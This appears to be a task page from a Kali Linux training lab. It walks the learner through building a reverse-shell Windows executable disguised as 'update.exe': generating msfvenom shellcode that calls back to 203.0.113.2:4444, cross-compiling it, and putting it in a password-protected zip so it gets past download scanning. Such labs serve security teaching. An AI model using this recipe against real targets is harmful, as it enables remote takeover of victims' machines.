Task 1 — Build the Malicious Windows Executable 0 / 5

You are logged into Kali as kali. A partially-built payload wrapper, main.cpp, is already sitting in your Documents folder. Use msfvenom to generate shellcode, splice it into the source, compile it into update.exe, then password-protect it in a zip so it survives download.

kali@kali: ~/Documents
kali@kali$

Checklist

  • Move into the Documents directory — cd Documents
  • Inspect the payload wrapper — cat main.cpp
  • Generate the reverse-shell payload with msfvenom (LHOST=203.0.113.2, LPORT=4444, format C)
  • Cross-compile to a Windows PE — x86_64-w64-mingw32-g++ main.cpp -o update.exe
  • Zip and password-protect the executable — zip -e update.zip update.exe
